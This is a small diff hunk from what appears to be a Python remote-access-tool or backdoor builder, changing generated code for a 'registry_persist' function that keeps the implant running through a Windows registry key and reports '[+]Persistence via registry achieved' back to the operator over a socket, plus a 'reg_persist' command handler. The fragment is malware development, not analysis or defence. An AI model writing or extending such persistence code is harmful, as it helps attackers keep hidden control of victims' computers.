@@ -20,7 +20,7 @@ def registry_persist(path):
     winreg.FlushKey(key)
     winreg.CloseKey(key)
     winreg.CloseKey(reg)
-    s.sendall('[+]Persistence via registry achieved'.encode())''')
+    main_send('[+]Persistence via registry achieved', s)''')
         config.logics.append('''
             elif command == "reg_persist":
                 registry_persist(path.join(getcwd(),path.abspath(argv[0])))''')
